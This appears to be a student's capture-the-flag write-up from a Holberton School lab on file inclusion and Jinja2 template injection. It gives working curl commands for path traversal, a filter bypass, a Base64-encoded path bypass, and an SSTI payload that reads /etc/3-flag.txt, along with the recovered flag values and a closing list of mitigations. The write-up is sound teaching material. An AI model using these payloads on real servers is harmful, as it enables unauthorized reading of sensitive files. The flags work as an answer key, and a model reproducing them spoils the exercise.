0x07. File Inclusion & Template Injection

This project explores several common web application vulnerabilities through progressive hands-on challenges on Cyber - WebSec 0x07.

The main objective is to understand how insecure file access, weak filtering, unsafe encoding logic, and server-side template rendering can be abused to read sensitive files or execute unintended logic on the server.

Learning objectives

At the end of this project, I should be able to explain:

what LFI is
what RFI is
how path traversal works
what ../ is used for in file inclusion attacks
how a file inclusion issue can lead to RCE
how weak filtering can be bypassed
why encoding is not a security control
what SSTI is and how Jinja2 can be abused
how to identify dangerous user-controlled parameters
how to apply proper mitigation strategies
Environment
OS: Kali Linux
Allowed editors: vi, vim, emacs
Target: http://web0x07.hbtn
Repository: holbertonschool-cyber_security
Directory: web_application_security/0x07_file_inclusion
Project methodology

For each task, I followed the same general approach:

Enumerate the application
inspect the main page
extract links, forms, and parameters
avoid guessing endpoints blindly
Identify the vulnerable entry point
file download endpoint
path parameter
template input field
Understand how user input is processed
clear path
split path + filename
Base64-encoded path
Jinja2 rendering
Exploit the weakness
path traversal
weak filter bypass
encoding abuse
SSTI
Retrieve the flag
Tasks summary
Task 0 — File Hub
Goal

Retrieve the flag stored in:

/etc/0-flag.txt
Logic

The page source of /task0/list_file revealed the real file retrieval endpoint:

download_file?filename=README.md&path=.

This showed that the application trusted two user-controlled parameters:

filename
path

After testing the endpoint normally, I modified the path parameter and discovered that the application accepted an absolute path.

Working exploit
curl -s 'http://web0x07.hbtn/task0/download_file?filename=0-flag.txt&path=/etc'
Flag
4e98c4f758935825f997d17ed249b80e
Task 1 — Another filter won’t help
Goal

Retrieve the flag stored in:

/tmp/secure_storage/1-flag.txt
Logic

The page source of /task1/list_file again exposed:

download_file?filename=README.md&path=.

This time, some filtering had been added.
Direct use of the normal example returned 403 Forbidden, and providing a full path in filename was also blocked.

However, the application still trusted the path parameter, so the protection was incomplete.

Working exploit
curl -s 'http://web0x07.hbtn/task1/download_file?filename=1-flag.txt&path=/tmp/secure_storage'
Flag
3cb16638446a7b860e3dc6473a106472
Lesson

Filtering only one parameter is useless if another user-controlled parameter still influences the final filesystem path.

Task 2 — Not even this can be bypassed
Goal

Retrieve the flag through a more restricted file retrieval endpoint.

Logic

The task 2 page exposed a hint:

abc123_secret_path_to_flag

The file list still revealed a familiar endpoint structure:

download_file?filename=README.md&path=.

But when tested, the server returned errors such as:

Access denied: Invalid encoding. Error: Incorrect padding

This showed that the path parameter was not expected in clear text, but in Base64.

So instead of attacking the endpoint with a raw path, I had to:

understand the required input format,
encode the hint in Base64,
send it through the vulnerable parameter.
Encode the secret path
echo -n 'abc123_secret_path_to_flag' | base64

Result:

YWJjMTIzX3NlY3JldF9wYXRoX3RvX2ZsYWc=
Working exploit
curl -s "http://web0x07.hbtn/task2/download_file?filename=2-flag.txt&path=YWJjMTIzX3NlY3JldF9wYXRoX3RvX2ZsYWc="
Flag
2f3e221b5a571d31cffaf39c84f8e7ac
Lesson

Encoding is not security.
If the server still trusts a user-controlled value after decoding it, the vulnerability remains.

Task 3 — The Jinja template
Goal

Retrieve the flag stored in:

/etc/3-flag.txt
Logic

This task was no longer about file path manipulation.
It was about Server-Side Template Injection (SSTI) in Jinja2.

From /task3/, I identified:

/task3/create_rapport
/task3/list_file

The report creation form contained a single injectable field:

<textarea id="rapport" name="rapport"></textarea>

This strongly suggested that user input was rendered inside a Jinja2 template.

SSTI confirmation

I first submitted:

START-{{7*7}}-END

When I opened the generated report, I got:

START-49-END

This confirmed that Jinja2 expressions were being evaluated on the server.

Context exploration

I then inspected the template context using:

{{ self._TemplateReference__context }}

This exposed useful objects and functions, including:

cycler
joiner
namespace
lipsum
config
request
flag_request

The most useful item was flag_request, which could be called directly from the template context.

Working exploit
curl -s -X POST http://web0x07.hbtn/task3/create_rapport \
  --data-urlencode 'rapport=FLAG-{{ flag_request("/etc/3-flag.txt") }}-END'

Then read the generated report with:

curl -i 'http://web0x07.hbtn/task3/view_file?filename=RAPPORT_17-09_1774372199_24-03-2026.html'

The response contained:

FLAG-9c1287695677932e26adf4c88cf2ae79-END
Flag
9c1287695677932e26adf4c88cf2ae79
Lesson

Rendering unsanitized user input inside a Jinja2 template can lead to SSTI, context disclosure, and direct access to sensitive server-side functionality.

Task 4 — Poison the logs
Goal

Escalate from file inclusion to code execution and capture the final flag.

Status

In progress / not documented yet in this README.

Key commands used during the project
Extract links from HTML
grep -Eoi '(href|action|src)="[^"]+"' file.html
Extract field names
grep -Eoi 'name="[^"]+"' file.html
Base64 encode a path
echo -n 'abc123_secret_path_to_flag' | base64
Compute MD5 of a string
echo -n '/tmp/secure_storage/2-flag.txt' | md5sum
Submit form data safely
curl -s -X POST URL --data-urlencode 'param=value'
Security lessons learned

This project shows that web vulnerabilities often come from the same root cause:

trusting user-controlled input
relying on weak filtering
encoding instead of validating
exposing dangerous internal objects in templates
Common mistakes observed
allowing user input to influence filesystem paths
filtering one parameter but not the other
assuming Base64 makes a path safe
rendering user input directly in Jinja2
Proper mitigations
never pass user input directly to filesystem APIs
use strict allow lists
validate the final resolved path, not only the raw input
keep sensitive files outside reachable application paths
never render untrusted user input as a server-side template
sandbox templates and avoid exposing dangerous objects/functions
Flags recovered
Task 0
4e98c4f758935825f997d17ed249b80e
Task 1
3cb16638446a7b860e3dc6473a106472
Task 2
2f3e221b5a571d31cffaf39c84f8e7ac
Task 3
9c1287695677932e26adf4c88cf2ae79
Author

Project completed as part of the Holberton School cybersecurity curriculum.
